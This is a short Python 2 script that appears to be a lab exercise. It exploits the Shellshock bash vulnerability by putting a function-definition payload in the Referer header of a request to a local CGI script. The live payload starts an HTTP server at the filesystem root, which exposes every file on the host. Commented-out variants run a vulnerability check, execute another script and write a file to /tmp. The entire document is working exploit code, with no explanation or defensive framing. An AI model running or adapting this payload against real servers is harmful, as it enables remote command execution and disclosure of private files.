import urllib2

url = 'http://localhost/cgi-bin/vulnerable.py'
exploit = "() { :;}; cd /; /bin/python -m http.server 8000"
request = urllib2.Request(url)
request.add_header('User-Agent', "python")
request.add_header('Referer', exploit)

try:
    result = urllib2.urlopen(request, timeout=5)
    print(result.info())
except Exception as e:
    print("Exception in the shellshock request!")
    print(e)

#exploit = "() { :;}; echo 'Shellshock: Vulnerable'"
#exploit = "() { :;}; /bin/python /srv/http/cgi-bin/test_server.py"
#exploit = "() { :;}; echo 'Hello World!' > /tmp/hacked.html"
